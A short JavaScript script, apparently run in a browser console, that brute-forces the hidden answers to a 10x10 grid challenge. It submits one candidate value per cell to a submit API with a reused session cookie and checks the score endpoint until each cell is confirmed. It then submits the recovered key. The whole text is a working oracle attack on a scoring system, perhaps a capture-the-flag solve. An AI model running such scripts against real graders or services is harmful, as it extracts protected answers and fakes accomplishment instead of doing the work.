cookieData = 'session=<session ID>'; // insert session ID here
answer = [];

for(let i = 0; i < 10; i++) {
    answer.push([]);
    for(let j = 0; j < 10; j++) {
        for(let ans = 0; ans < 4; ans++) {
            document.cookie = cookieData;
            submission = [...Array(10)].map(() => [...Array(10)].map(() => -1));
            submission[i][j] = ans;
            let res = await fetch('/api/submit', {
                method: 'POST',
                credentials: 'include',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(submission)
            });
            let json = await res.json();
            res = await fetch('/api/score', {
                method: 'GET',
                credentials: 'include',
            });
            json = await res.json();
            if(json.data.score == 1) {
                answer[i].push(ans);
                break;
            }
        }
    }
}

document.cookie = cookieData;
submission = answer;
let res = await fetch('/api/submit', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(submission)
});
let json = await res.json();
res = await fetch('/api/score', {
    method: 'GET',
    credentials: 'include',
});
json = await res.json();
console.log(json.data)